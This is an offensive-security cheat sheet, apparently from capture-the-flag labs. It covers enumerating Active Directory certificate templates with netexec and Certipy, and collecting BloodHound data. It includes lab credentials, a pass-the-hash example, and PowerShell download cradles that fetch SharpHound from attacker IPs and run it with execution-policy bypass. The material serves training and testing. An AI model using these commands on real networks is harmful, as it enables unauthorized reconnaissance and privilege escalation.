## ADCS Enumeration

Basic enumeration via netexec:
```bash
nxc ldap dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' -M adcs
```

Certipy — enumerate vulnerable templates:
```bash
certipy find -u j.fleischman@fluffy.htb -p J0elTHEM4n1990! -dc-ip 10.129.16.130 -vulnerable -stdout
certipy find -target dc01.tombwatcher.htb -u cert_admin -p 'vinh' -vulnerable -stdout
```

Certipy with NTLM hash instead of password:
```bash
certipy find -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -vulnerable -stdout
```

Get full list of ADCS templates:
```bash
certipy find -u j.fleischman@fluffy.htb -p 'J0elTHEM4n1990!' -stdout
```

## BloodHound

### Collection — on victim machine
```bash
.\SharpHound.exe
```

SharpHound via PowerShell download cradle:
```bash
iwr http://10.10.14.103:4444/SharpHound.ps1 -OutFile SharpHound.ps1
Invoke-BloodHound -CollectionMethods All -OutputDirectory C:\Users\svc-alfresco\AppData\Local\Temp -Verbosity 2
```

Full download + bypass + run sequence:
```bash
iwr -uri http://192.168.119.5:8000/SharpHound.ps1 -Outfile SharpHound.ps1
powershell -ep bypass
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
```

### Collection — from attacker machine
```bash
bloodhound-ce-python -c all -d fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' -ns 10.10.11.69 --zip
bloodhound-ce-python -u 'ryan.naylor' -p 'HollowOct31Nyt' -k -d voleur.htb -ns 10.129.4.178 -dc dc.voleur.htb -c all --zip --dns-tcp
```

